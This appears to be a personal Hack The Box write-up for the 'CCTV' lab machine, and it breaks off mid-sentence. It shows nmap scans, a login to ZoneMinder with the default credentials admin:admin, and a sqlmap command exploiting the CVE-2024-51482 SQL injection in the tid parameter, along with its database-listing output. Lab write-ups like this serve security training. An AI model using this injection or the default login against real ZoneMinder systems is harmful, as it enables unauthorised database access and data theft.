# CCTV_HTB
Personal writeup of the seasonal CCTV Hack The Box machine


Intial scan of the machine gives us 2 PoA. We can then scan further to reveal an http server being hosted on port 80.

```
┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/CCTV]
└─# nmap -sS 10.129.58.206        
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-14 15:09 +0900
Nmap scan report for 10.129.58.206
Host is up (0.38s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 3.61 seconds
                                                                          
┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/CCTV]
└─# nmap -sS -sV 10.129.58.206  
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-14 15:10 +0900
Nmap scan report for 10.129.58.206
Host is up (0.35s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.96 seconds

┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/CCTV]
└─# nmap -sS -sC 10.129.58.206
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-14 15:11 +0900
Nmap scan report for 10.129.58.206
Host is up (0.28s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|_  256 76:1d:73:98:fa:05:f7:0b:04:c2:3b:c4:7d:e6:db:4a (ECDSA)
80/tcp open  http
|_http-title: Did not follow redirect to http://cctv.htb/
```

The machine itself is setup to block ping probes so we can bypass that and improve scan efficiency by using the `-sS` flag. 

The scan produces a result that may take a minute to load but eventually pulls up a Zoneminder CCTV website. The website allows for admin/staff login. 

We can scan the network using `ffuf` or `feroxbuster` but nothing of note is revealed in the scan.

Note that Zoneminder has default credentials so when using `admin:admin` we are actually able to bypass any exploit and log directly on to the dashboard. We then are able to see the version info. `Zoneminder v1.37.63`.

CVE and Zoneminder v1.37.63 placed into the search bar reveals [CVE-2024-51482](https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3)

Zoneminder v1.37.63 is vulnerable to boolean-based SQL Injection. The impact of this is total control of SQL Databases: loss of data confidentiality and integrity. Leading to information disclosure and possible privilege escalation.

We can exploit the vulnerability and use the PoC provided. We can grab the session ID and automate it using the `zmPoC.sh` file and `sqlmap`.

```
#!/bin/bash

sqlmap -u 'http://10.129.61.151/zm/index.php?view=request&request=event&action=removetag&tid=1' \
	--cookie="ZMSESSID=SESSION_COOKIE_HERE" \
	-p tid --dbms=mysql --batch --dbs
```

sqlmap takes a long time to run so after about 10-20 minutes we can see revealed information about the SQL databases.

```
[20:01:24] [INFO] adjusting time delay to 3 seconds due to good response times
3
[20:01:27] [INFO] retrieved: information_schema
[20:06:12] [INFO] retrieved: performance_schema
[20:10:47] [INFO] retrieved: zm
available databases [3]:
[*] information_schema
[*] performance_schema
[*] zm

[20:11:25] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.129.61.151'                                          

[*] ending @ 20:11:25 /2026-05-17/
```

Great. This allows us to 